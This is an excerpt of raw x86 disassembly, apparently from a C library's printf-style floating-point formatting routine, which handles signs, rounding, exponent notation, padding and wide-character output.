mov edx, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x80682db
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806831a
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x80682ff
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x80682ff
mov dword [var_4h], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x80681d1
jmp 0x806818b
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8068360
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x80681d1
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
jmp 0x806833b
mov edx, dword [arg_ch]
movzx eax, byte [edx + 0xc]
test al, 0x40
je 0x80683c1
mov eax, dword [var_7ch]
test eax, eax
je 0x80683a7
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806839d
mov dword [eax], 0x2b
jmp 0x80681cb
mov dword [var_4h], 0x2b
jmp 0x8068333
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x80683b7
mov byte [eax], 0x2b
jmp 0x8068355
mov dword [var_4h], 0x2b
jmp 0x8068368
test al, 0x10
je 0x80681d4
mov eax, dword [var_7ch]
test eax, eax
je 0x8068400
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x80683e9
mov dword [eax], 0x20
jmp 0x80681cb
mov edx, dword [arg_8h]
mov dword [var_4h], 0x20
mov dword [esp], edx
jmp 0x8068336
lea esi, [esi]
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x8068419
mov byte [eax], 0x20
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
jmp 0x80681d1
mov dword [var_4h], 0x20
mov dword [esp], ecx
jmp 0x806836b
mov edx, dword [arg_8h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], edx
call fcn.08075680
jmp 0x8068187
mov esi, dword [var_28h]
mov dword [var_34h], 0
mov eax, esi
neg eax
cmp esi, 0xffffffff
cmovg eax, esi
lea edx, [eax + 0x3e]
add eax, 0x1f
cmovs eax, edx
sar eax, 5
lea eax, [eax*4 + 0x20]
sub esp, eax
lea ecx, [var_2bh]
sub esp, eax
lea edx, [var_2bh]
and ecx, 0xfffffff0
sub esp, eax
lea eax, [var_2bh]
and edx, 0xfffffff0
mov dword [var_20h], ecx
and eax, 0xfffffff0
mov dword [var_38h], edx
cmp esi, 2
mov dword [var_30h], eax
jle 0x8069749
mov eax, dword [var_70h]
mov dword [var_88h], 0
mov dword [var_8ch], 0xc
mov dword [var_90h], 0
mov dword [var_94h], 0x80a70f0
add eax, esi
test al, 0x1f
mov dword [var_9ch], eax
jne 0x80696c5
mov edi, dword [var_24h]
mov ebx, edi
dec ebx
js 0x806851a
lea edx, [ebp + ebx*4 - 0x48]
mov edi, eax
mov dword [var_f0h], edx
cmp edi, 0xffffffff
lea eax, [edi + 0x1f]
cmovg eax, edi
sar eax, 5
add eax, ebx
mov dword [var_f4h], eax
mov eax, dword [var_f0h]
sub dword [var_f0h], 4
dec ebx
mov edx, dword [eax]
mov eax, dword [var_f4h]
mov dword [ecx + eax*4], edx
jns 0x80684e8
mov edi, dword [var_24h]
mov edx, dword [var_70h]
lea eax, [edx + esi]
cmp eax, 0xffffffff
lea edx, [eax + 0x1f]
cmovle eax, edx
sar eax, 5
lea eax, [eax + edi]
mov dword [var_24h], eax
mov ecx, dword [var_70h]
xor ebx, ebx
lea edx, [ecx + esi]
lea esi, [esi]
cmp edx, 0xffffffff
lea eax, [edx + 0x1f]
cmovg eax, edx
sar eax, 5
cmp ebx, eax
jge 0x806855d
mov ecx, dword [var_20h]
mov dword [ecx + ebx*4], 0
inc ebx
jmp 0x8068540
mov ebx, dword [var_34h]
sub dword [var_94h], 0x10
mov eax, dword [var_88h]
mov edx, dword [var_94h]
add eax, dword [edx + 8]
dec eax
cmp esi, eax
jl 0x80685b1
test ebx, ebx
jne 0x8069670
mov ebx, dword [edx + 4]
mov esi, dword [edx]
mov edi, dword [var_38h]
cld
lea ecx, [ebx*4]
lea esi, [esi*4 + 0x80a6240]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
cmp dword [var_24h], ebx
jg 0x8069623
je 0x8069605
mov ebx, dword [var_34h]
dec dword [var_8ch]
cmp dword [var_94h], 0x80a7020
jbe 0x80685c8
mov esi, dword [var_28h]
jmp 0x8068560
mov eax, dword [var_90h]
test ebx, ebx
mov dword [var_28h], eax
jle 0x806866f
mov edi, dword [var_30h]
xor esi, esi
mov eax, dword [edi]
test eax, eax
jne 0x8068605
mov ecx, dword [var_20h]
mov eax, dword [ecx]
mov edx, ecx
test eax, eax
jne 0x8068605
inc esi
lea eax, [esi*4]
mov ecx, dword [edi + eax]
test ecx, ecx
jne 0x8068605
mov ecx, dword [edx + eax]
test ecx, ecx
je 0x80685ef
bsr eax, dword [edi + ebx*4 - 4]
xor eax, 0x1f
mov dword [var_98h], eax
jne 0x806946b
test esi, esi
jle 0x806866f
mov eax, ebx
xor ecx, ecx
sub eax, esi
cmp dword [var_98h], eax
jge 0x8068641
mov edx, edi
mov eax, dword [edx + esi*4]
inc ecx
mov dword [edx], eax
mov ebx, dword [var_34h]
add edx, 4
mov eax, ebx
sub eax, esi
cmp ecx, eax
jl 0x806862d
mov edi, dword [var_24h]
xor ecx, ecx
sub ebx, esi
mov dword [var_34h], ebx
mov eax, edi
sub eax, esi
cmp ecx, eax
jge 0x806866a
mov edx, dword [var_20h]
mov eax, dword [edx + esi*4]
inc ecx
mov dword [edx], eax
mov edi, dword [var_24h]
add edx, 4
mov eax, edi
sub eax, esi
cmp ecx, eax
jl 0x8068656
sub edi, esi
mov dword [var_24h], edi
mov eax, dword [arg_ch]
mov edx, 0
xor edi, edi
test edx, edx
mov dword [var_cch], 0
mov dword [var_dch], 0
mov ebx, 0x80aad14
mov eax, dword [eax + 4]
mov dword [var_b4h], eax
je 0x80686ad
mov dword [esp], 5
call section.
mov ebx, eax
mov eax, dword [ebx]
test eax, eax
je 0x806943e
mov edx, dword [arg_ch]
mov ebx, dword [edx + 8]
cmp dword [eax + ebx*4], 0x65
je 0x80693f8
mov eax, 0
mov esi, 0x80aad14
test eax, eax
je 0x80686e3
mov dword [esp], 5
call section.
mov esi, eax
mov eax, dword [esi]
test eax, eax
je 0x80693c5
cmp dword [eax + ebx*4], 0x66
je 0x806934c
mov edx, dword [arg_ch]
mov dword [var_d4h], 6
mov eax, dword [edx]
test eax, eax
js 0x8068724
mov dword [var_d4h], eax
test eax, eax
mov eax, 1
cmovne eax, dword [var_d4h]
mov dword [var_d4h], eax
mov edx, dword [var_2ch]
test edx, edx
jne 0x8069340
mov ecx, dword [var_d4h]
cmp dword [var_28h], ecx
jge 0x8069315
mov eax, dword [var_28h]
mov dword [var_c8h], 0
mov esi, dword [var_d4h]
mov dword [var_3ch], 0x66
inc eax
test edx, edx
mov edx, dword [var_d4h]
cmovne eax, dword [var_c8h]
add edx, 5
mov dword [var_c4h], edx
mov dword [var_c8h], eax
sub esi, eax
mov ecx, dword [arg_ch]
mov eax, 0
mov dword [var_d8h], 0
test byte [ecx + 0xc], 8
cmovne eax, esi
mov dword [var_d0h], eax
mov eax, dword [var_64h]
test eax, eax
je 0x80687c0
mov edx, dword [var_64h]
mov ecx, dword [var_c8h]
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.08069f90
mov dword [var_dch], eax
add dword [var_c4h], eax
mov eax, dword [var_c4h]
xor ebx, ebx
shl eax, 3
cmp eax, 0x1000
ja 0x8069300
mov ebx, 1
xor eax, eax
test ebx, ebx
sete al
test eax, eax
mov dword [var_c0h], eax
jne 0x80692cf
mov ecx, dword [var_c4h]
lea eax, [ecx*4 + 0x18]
sub esp, eax
lea eax, [var_2bh]
and eax, 0xfffffff0
mov dword [var_b8h], eax
mov edx, dword [var_b8h]
mov eax, dword [var_2ch]
add edx, 8
test eax, eax
mov dword [var_bch], edx
mov ebx, edx
je 0x806882e
cmp dword [var_3ch], 0x66
je 0x80692af
mov ecx, dword [var_c8h]
cmp dword [var_cch], ecx
jge 0x8068871
sub ecx, dword [var_cch]
mov dword [var_cch], ecx
lea ecx, [var_bp_ch]
dec dword [var_cch]
call fcn.08067e10
mov ecx, dword [var_cch]
mov dword [ebx], eax
add ebx, 4
test ecx, ecx
jne 0x8068848
mov eax, dword [var_c8h]
mov dword [var_cch], eax
mov edx, dword [arg_ch]
mov dword [var_d8h], 1
test byte [edx + 0xc], 8
jne 0x8068892
mov edx, dword [var_d0h]
test edx, edx
jle 0x806928b
mov ecx, dword [var_58h]
mov dword [ebx], ecx
add ebx, 4
cmp edi, dword [var_d0h]
jl 0x80688b0
cmp edi, esi
jge 0x80688ec
cmp dword [var_24h], 1
jle 0x8069279
lea ecx, [var_bp_ch]
inc edi
call fcn.08067e10
mov dword [ebx], eax
add ebx, 4
cmp eax, 0x30
je 0x806924a
mov dword [var_d8h], 1
cmp edi, dword [var_d0h]
jl 0x80688b0
cmp edi, esi
jge 0x80688ec
cmp dword [var_24h], 1
jg 0x80688b0
mov eax, dword [var_20h]
mov eax, dword [eax]
test eax, eax
jne 0x80688b0
lea ecx, [var_bp_ch]
call fcn.08067e10
cmp eax, 0x34
jle 0x8068937
cmp eax, 0x35
mov edx, ebx
je 0x80691de
test edi, edi
jle 0x8068924
mov eax, dword [ebx - 4]
lea edx, [ebx - 4]
cmp eax, dword [var_58h]
je 0x8068924
cmp eax, 0x39
je 0x80691c0
cmp eax, dword [var_58h]
je 0x8068924
inc eax
mov dword [edx], eax
test edi, edi
je 0x8069031
mov ecx, dword [var_58h]
cmp dword [edx], ecx
je 0x8069031
cmp edi, dword [var_d0h]
jle 0x8068949
cmp dword [ebx - 4], 0x30
je 0x8069016
test edi, edi
jne 0x8068962
mov eax, dword [arg_ch]
test byte [eax + 0xc], 8
jne 0x8068962
mov edx, dword [var_58h]
lea eax, [ebx - 4]
cmp dword [ebx - 4], edx
cmove ebx, eax
mov edi, dword [var_64h]
test edi, edi
je 0x8068998
mov ecx, dword [var_dch]
mov eax, dword [var_60h]
mov edx, dword [var_64h]
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov ecx, dword [var_cch]
mov eax, dword [var_bch]
mov dword [esp], edx
mov edx, ebx
call fcn.08069ff0
sub esp, 0xc
mov ebx, eax
mov eax, dword [var_3ch]
cmp eax, 0x66
je 0x80689eb
mov dword [ebx], eax
mov esi, dword [var_28h]
mov ecx, 0xa
add ebx, 4
xor eax, eax
mov edx, ebx
add ebx, 4
cmp dword [var_2ch], 0
setne al
cmp ecx, esi
lea eax, [eax + eax + 0x2b]
mov dword [edx], eax
mov edx, esi
jg 0x80689d1
lea eax, [ecx + ecx*4]
lea ecx, [eax + eax]
cmp ecx, edx
jle 0x80689c7
cmp edx, 9
jg 0x8068fe5
mov dword [ebx], 0x30
add ebx, 4
lea eax, [esi + 0x30]
mov dword [ebx], eax
add ebx, 4
mov edx, dword [var_40h]
test edx, edx
jne 0x80689fb
mov ecx, dword [arg_ch]
test byte [ecx + 0xc], 0x50
je 0x8068a01
dec dword [var_b4h]
mov eax, ebx
sub eax, dword [var_bch]
sar eax, 2
sub dword [var_b4h], eax
mov eax, dword [arg_ch]
test byte [eax + 0xc], 0x20
jne 0x8068a69
mov eax, dword [eax + 0x10]
cmp eax, 0x30
je 0x8068a69
mov esi, dword [var_b4h]
test esi, esi
jle 0x8068a69
mov ecx, dword [var_7ch]
test ecx, ecx
je 0x8068fc7
mov edx, dword [var_b4h]
mov ecx, dword [arg_8h]
mov dword [var_4h], eax
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.08075900
cmp eax, dword [var_b4h]
jne 0x806818b
mov eax, dword [var_b4h]
mov edx, dword [var_40h]
mov dword [var_74h], eax
test edx, edx
je 0x8068f11
mov edx, dword [var_7ch]
test edx, edx
je 0x8068ee6
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068eca
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
mov edx, dword [arg_ch]
inc dword [var_74h]
movzx eax, byte [edx + 0xc]
test al, 0x20
jne 0x8068ab5
mov ecx, dword [arg_ch]
cmp dword [ecx + 0x10], 0x30
je 0x8068e5f
mov eax, dword [var_7ch]
xor edi, edi
mov dword [var_e0h], 0
test eax, eax
jne 0x8068b6d
mov ecx, dword [var_54h]
mov dword [esp], ecx
call fcn.08053400
mov dword [var_e8h], 0
mov dword [var_ech], eax
mov eax, dword [var_5ch]
test eax, eax
je 0x8068aff
mov eax, dword [var_5ch]
mov dword [esp], eax
call fcn.08053400
mov dword [var_e8h], eax
mov edi, dword [var_c0h]
test edi, edi
jne 0x8068e22
mov ecx, dword [var_dch]
mov eax, dword [var_c4h]
imul ecx, dword [var_e8h]
add eax, dword [var_ech]
lea eax, [ecx + eax + 0x14]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_2bh]
and eax, 0xfffffff0
mov dword [var_e0h], eax
mov esi, dword [var_bch]
mov edi, dword [var_e0h]
cmp esi, ebx
jae 0x8068b6d
mov eax, dword [esi]
cmp eax, dword [var_58h]
je 0x8068e0f
cmp eax, dword [var_60h]
je 0x8068def
movzx eax, byte [esi]
mov byte [edi], al
inc edi
add esi, 4
cmp esi, ebx
jb 0x8068b4c
mov eax, dword [arg_ch]
mov ecx, dword [var_e0h]
test byte [eax + 0xd], 8
mov dword [var_e4h], ecx
jne 0x8068dd8
mov esi, dword [var_7ch]
test esi, esi
je 0x8068dcb
mov esi, ebx
sub esi, dword [var_bch]
sar esi, 2
mov ecx, dword [var_7ch]
test ecx, ecx
je 0x8068dba
sub ebx, dword [var_bch]
sar ebx, 2
test ebx, ebx
jne 0x8068d7c
mov edi, dword [var_7ch]
test edi, edi
je 0x8068cf3
mov eax, esi
dec esi
test eax, eax
je 0x8068c11
mov eax, dword [var_bch]
mov ebx, dword [var_7ch]
mov ecx, dword [eax]
add eax, 4
test ebx, ebx
mov dword [var_bch], eax
je 0x8068cca
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068cb5
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806818b
mov eax, esi
inc dword [ebp - 0x74]
dec esi
test eax, eax
jne 0x8068bca
mov eax, dword [var_c0h]
test eax, eax
jne 0x8068c94
mov ecx, dword [arg_ch]
test byte [ecx + 0xc], 0x20
je 0x8068257
mov eax, dword [ebp - 0xb4]
test eax, eax
jle 0x8068257
mov eax, dword [ebp - 0x7c]
test eax, eax
je 0x8068c73
mov eax, dword [ebp - 0xb4]
mov edx, dword [ebp + 8]
mov dword [esp + 8], eax
mov eax, dword [ecx + 0x10]
mov dword [esp], edx
mov dword [esp + 4], eax
call fcn.08075900
cmp eax, dword [ebp - 0xb4]
jne 0x806818b
mov eax, dword [ebp - 0xb4]
add dword [ebp - 0x74], eax
jmp 0x8068257
mov ecx, dword [ebp - 0xb4]
mov edx, dword [ebp + 0xc]
mov dword [esp + 8], ecx
mov ecx, dword [ebp + 8]
mov eax, dword [edx + 0x10]
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.08075680
jmp 0x8068c59
mov eax, dword [var_e0h]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [var_b8h]
mov dword [esp], edx
call fcn.08051180
jmp 0x8068c1b
mov edx, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x8068c01
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8068ce2
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x8068cc4
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8068cc4
mov eax, esi
dec esi
test eax, eax
je 0x8068c11
mov eax, dword [var_e4h]
mov edx, dword [var_7ch]
movsx ecx, byte [eax]
inc eax
test edx, edx
mov dword [var_e4h], eax
je 0x8068d53
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068d41
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806818b
mov eax, esi
inc dword [ebp - 0x74]
dec esi
test eax, eax
jne 0x8068cfe
jmp 0x8068c11
mov edx, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x8068d2c
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8068d6b
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x8068d50
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8068d50
mov edx, dword [var_7ch]
mov ecx, dword [arg_8h]
test edx, edx
mov eax, dword [ecx + 0x94]
mov edx, dword [var_bch]
cmove edx, dword [var_e4h]
mov dword [var_8h], esi
mov dword [esp], ecx
mov dword [var_4h], edx
call dword [eax + 0x1c]
mov edx, 0xffffffff
cmp eax, esi
jne 0x8068190
add dword [var_74h], esi
jmp 0x8068c11
sub edi, dword [var_e4h]
cmp edi, 0x14
jle 0x8068bb8
jmp 0x8068d7c
mov esi, edi
sub esi, dword [var_e4h]
jmp 0x8068b9c
mov dword [var_4h], edi
mov dword [esp], ecx
call fcn.08067c40
mov dword [var_e4h], eax
jmp 0x8068b86
mov eax, dword [var_e8h]
mov edx, dword [var_5ch]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], edi
call fcn.08053740
mov edi, eax
jmp 0x8068b66
mov edx, dword [var_ech]
mov ecx, dword [var_54h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
jmp 0x8068e00
mov edx, dword [var_dch]
mov eax, dword [var_c4h]
imul edx, dword [var_e8h]
add eax, dword [var_ech]
lea eax, [edx + eax + 2]
mov dword [esp], eax
call fcn.08050fe0
mov edx, 0xffffffff
test eax, eax
mov dword [var_e0h], eax
jne 0x8068b3c
jmp 0x8068190
mov eax, dword [var_b4h]
test eax, eax
jle 0x8068ab5
mov eax, dword [var_7ch]
test eax, eax
je 0x8068eab
mov eax, dword [var_b4h]
mov edx, dword [arg_8h]
mov dword [var_4h], 0x30
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08075900
cmp eax, dword [var_b4h]
jne 0x806818b
mov edx, dword [var_b4h]
add dword [var_74h], edx
jmp 0x8068ab5
mov ecx, dword [var_b4h]
mov eax, dword [arg_8h]
mov dword [var_4h], 0x30
mov dword [var_8h], ecx
mov dword [esp], eax
call fcn.08075680
jmp 0x8068e91
mov dword [var_4h], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x8068a9a
jmp 0x806818b
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8068eff
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x8068a9a
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
jmp 0x8068eda
mov ecx, dword [arg_ch]
movzx eax, byte [ecx + 0xc]
test al, 0x40
je 0x8068f72
mov eax, dword [var_7ch]
test eax, eax
je 0x8068f4c
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068f3c
mov dword [eax], 0x2b
jmp 0x8068a94
mov edx, dword [arg_8h]
mov dword [var_4h], 0x2b
mov dword [esp], edx
jmp 0x8068ed5
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x8068f65
mov byte [eax], 0x2b
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
jmp 0x8068a9a
mov dword [var_4h], 0x2b
mov dword [esp], ecx
jmp 0x8068f0a
test al, 0x10
je 0x8068aa4
mov eax, dword [var_7ch]
test eax, eax
je 0x8068fa7
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068f9a
mov dword [eax], 0x20
jmp 0x8068a94
mov dword [var_4h], 0x20
jmp 0x8068ed2
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8068fba
mov byte [eax], 0x20
jmp 0x8068ef4
mov dword [var_4h], 0x20
jmp 0x8068f07
mov edx, dword [var_b4h]
mov ecx, dword [arg_8h]
mov dword [var_4h], eax
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.08075680
jmp 0x8068a51
mov eax, ecx
mov edx, 0x66666667
imul edx
mov eax, ecx
sar eax, 0x1f
sar edx, 2
sub edx, eax
mov eax, esi
mov ecx, edx
cdq
idiv ecx
lea eax, [eax + 0x30]
mov esi, edx
mov dword [var_28h], edx
mov dword [ebx], eax
add ebx, 4
cmp ecx, 0xa
jg 0x8068fe5
jmp 0x80689e3
sub ebx, 4
dec edi
cmp edi, dword [var_d0h]
jle 0x8068949
cmp dword [ebx - 4], 0x30
je 0x8069016
jmp 0x8068949
mov ecx, dword [var_58h]
lea eax, [edx - 4]
cmp dword [edx - 4], ecx
cmove edx, eax
sub edx, 4
cmp edx, dword [var_bch]
jb 0x8069060
cmp dword [edx], 0x39
je 0x806919f
cmp edx, dword [var_bch]
jb 0x8069060
inc dword [edx]
jmp 0x8068937
cmp dword [var_3ch], 0x66
je 0x80690b2
mov eax, dword [var_bch]
mov dword [eax], 0x31
mov eax, dword [var_2ch]
test eax, eax
jne 0x80690ac
mov eax, dword [var_28h]
inc eax
mov dword [var_28h], eax
mov eax, dword [var_cch]
add eax, edi
cmp eax, dword [var_d4h]
jle 0x8068937
mov edx, eax
sub edx, dword [var_d4h]
lea eax, [edx*4]
sub edi, edx
sub ebx, eax
jmp 0x8068937
mov eax, dword [var_28h]
dec eax
jmp 0x806907d
mov edx, dword [var_d4h]
cmp dword [var_cch], edx
je 0x80690db
sub dword [var_bch], 4
inc dword [var_cch]
mov ecx, dword [var_bch]
mov dword [ecx], 0x31
jmp 0x8069080
sub dword [var_bch], 4
mov eax, dword [var_58h]
mov ecx, dword [var_bch]
mov edx, dword [arg_ch]
mov dword [ecx], eax
sub ecx, 4
mov dword [ecx], 0x31
mov dword [var_bch], ecx
test byte [edx + 0xc], 8
jne 0x8069109
test edi, edi
jle 0x806911e
mov ecx, dword [var_cch]
mov eax, dword [var_bch]
inc edi
mov dword [eax + ecx*4 + 8], 0x30
mov edx, 0
add edi, dword [var_cch]
inc dword [var_28h]
test edx, edx
mov dword [var_cch], 1
mov esi, 0x80aad18
je 0x806914d
mov dword [esp], 4
call section.
mov esi, eax
mov ecx, dword [esi]
test ecx, ecx
je 0x8069173
mov edx, dword [arg_ch]
mov eax, dword [edx + 8]
mov edx, 0x45
test byte [ecx + eax*2 + 1], 1
mov eax, 0x65
cmove edx, eax
mov dword [var_3ch], edx
jmp 0x8069080
mov ecx, 0
test ecx, ecx
je 0x8069198
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [esi], eax
mov ecx, eax
jmp 0x8069153
mov eax, dword [0x80a9ab4]
jmp 0x8069188
mov dword [edx], 0x30
sub edx, 4
cmp edx, dword [var_bch]
jb 0x8069060
cmp dword [edx], 0x39
je 0x806919f
jmp 0x8069051
mov esi, esi
mov dword [edx], 0x30
sub edx, 4
mov eax, dword [edx]
cmp eax, dword [var_58h]
je 0x8068924
cmp eax, 0x39
je 0x80691c0
jmp 0x806891c
mov eax, dword [ebx - 4]
cmp eax, dword [var_58h]
je 0x8069244
test al, 1
jne 0x8068904
mov ecx, dword [var_24h]
cmp ecx, 1
je 0x8069236
mov eax, dword [var_34h]
test eax, eax
jne 0x8068904
test ecx, ecx
je 0x8068937
mov eax, dword [var_20h]
lea eax, [eax + ecx*4]
mov esi, dword [eax - 4]
test esi, esi
jne 0x8069229
sub eax, 4
sub eax, 4
dec ecx
je 0x8068937
mov esi, dword [eax]
test esi, esi
je 0x8069219
test ecx, ecx
jne 0x8068904
jmp 0x8068937
mov eax, dword [var_20h]
mov eax, dword [eax]
test eax, eax
jne 0x80691f6
jmp 0x8068937
test byte [ebx - 8], 1
jmp 0x80691e8
mov eax, dword [var_d8h]
test eax, eax
jne 0x80688d1
mov eax, dword [var_d0h]
inc esi
inc eax
cmp dword [var_d0h], 1
cmovl eax, dword [var_d0h]
mov dword [var_d0h], eax
jmp 0x80688d1
mov eax, dword [var_20h]
mov eax, dword [eax]
test eax, eax
jne 0x80688b0
jmp 0x80688ec
test esi, esi
jle 0x806889a
cmp dword [var_24h], 1
jg 0x8068892
mov eax, dword [var_20h]
mov eax, dword [eax]
test eax, eax
je 0x806889a
jmp 0x8068892
mov eax, dword [var_b8h]
mov edx, dword [var_58h]
dec dword [var_28h]
mov ebx, eax
mov dword [eax + 8], 0x30
mov dword [eax + 0xc], edx
add ebx, 0x10
jmp 0x806889a
mov edx, dword [var_c4h]
lea eax, [edx*4 + 8]
mov dword [esp], eax
call fcn.08050fe0
mov edx, 0xffffffff
test eax, eax
mov dword [var_b8h], eax
jne 0x806880c
jmp 0x8068190
lea esi, [esi]
mov dword [esp], eax
call fcn.0807adb0
test eax, eax
je 0x80687db
jmp 0x80687d6
lea eax, [ebx - 2]
mov esi, dword [var_d4h]
mov dword [var_c8h], 1
mov dword [var_3ch], eax
mov eax, dword [var_d4h]
dec esi
add eax, 7
mov dword [var_c4h], eax
jmp 0x8068779
cmp dword [var_28h], 4
jle 0x806873e
jmp 0x8069315
mov eax, dword [arg_ch]
mov dword [var_d0h], 6
mov dword [var_3ch], 0x66
mov dword [var_d4h], 0x7fffffff
mov dword [var_d8h], 1
mov esi, dword [eax]
mov eax, dword [var_2ch]
test esi, esi
cmovs esi, dword [var_d0h]
test eax, eax
mov dword [var_d0h], esi
jne 0x80693a7
mov eax, dword [var_28h]
lea edx, [eax + 1]
lea eax, [esi + eax + 2]
mov dword [var_c8h], edx
mov dword [var_c4h], eax
jmp 0x8068798
mov ecx, dword [var_d0h]
mov dword [var_c8h], 1
add ecx, 2
mov dword [var_c4h], ecx
jmp 0x8068798
mov edx, 0
test edx, edx
je 0x80693f1
mov dword [esp], 3
call section.
mov ecx, dword [arg_ch]
mov ebx, dword [ecx + 8]
mov eax, dword [eax]
mov eax, dword [eax + 0x30]
add eax, 0x200
mov dword [esi], eax
jmp 0x80686ed
mov eax, dword [0x80a9ab4]
jmp 0x80693e0
mov esi, dword [edx]
mov dword [var_d0h], 6
mov dword [var_3ch], ebx
mov dword [var_c8h], 1
mov dword [var_d4h], 0x7fffffff
mov dword [var_d8h], 1
test esi, esi
cmovs esi, dword [var_d0h]
mov ecx, esi
mov dword [var_d0h], esi
add ecx, 8
jmp 0x80693ba
mov ecx, 0
test ecx, ecx
je 0x8069464
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x30]
add eax, 0x200
mov dword [ebx], eax
jmp 0x80686b7
mov eax, dword [0x80a9ab4]
jmp 0x8069453
lea edx, [esi*4]
mov eax, dword [edi + edx]
test eax, eax
je 0x80695f9
mov eax, dword [var_20h]
bsf ecx, dword [edi + edx]
cmp dword [eax + edx], 0
je 0x8069494
bsf eax, dword [eax + edx]
cmp eax, ecx
jge 0x8069494
mov ecx, eax
test esi, esi
jne 0x80694ab
mov eax, 0x20
sub eax, dword [var_98h]
cmp eax, ecx
jg 0x80695a0
mov dword [var_a0h], 0x20
mov eax, dword [var_98h]
sub dword [var_a0h], eax
cmp dword [var_a0h], ecx
jg 0x8069537
mov edx, dword [var_a0h]
sub ebx, esi
mov dword [esp], edi
mov dword [var_8h], ebx
lea ebx, [esi*4]
lea eax, [ebx + edi]
mov dword [var_ch], edx
mov dword [var_4h], eax
call fcn.0808c750
mov eax, esi
mov ecx, dword [var_a0h]
not eax
add dword [var_34h], eax
mov eax, dword [var_24h]
mov dword [var_ch], ecx
sub eax, esi
mov dword [var_8h], eax
mov eax, dword [var_20h]
lea ebx, [ebx + eax]
mov dword [esp], eax
mov dword [var_4h], ebx
call fcn.0808c750
mov edx, dword [var_20h]
mov eax, dword [var_24h]
sub eax, esi
mov edx, dword [edx + eax*4 - 4]
lea ecx, [eax - 1]
test edx, edx
cmove eax, ecx
mov dword [var_24h], eax
jmp 0x806866f
mov eax, dword [var_a0h]
sub ebx, esi
mov dword [esp], edi
mov dword [var_ch], eax
lea eax, [ebx + 1]
lea ebx, [esi*4]
mov dword [var_8h], eax
lea eax, [ebx + edi - 4]
mov dword [var_4h], eax
call fcn.0808c750
mov eax, dword [var_24h]
mov edx, dword [var_a0h]
sub dword [var_34h], esi
sub eax, esi
mov dword [var_ch], edx
inc eax
mov edx, dword [var_20h]
mov dword [var_8h], eax
lea eax, [ebx + edx - 4]
mov dword [esp], edx
mov dword [var_4h], eax
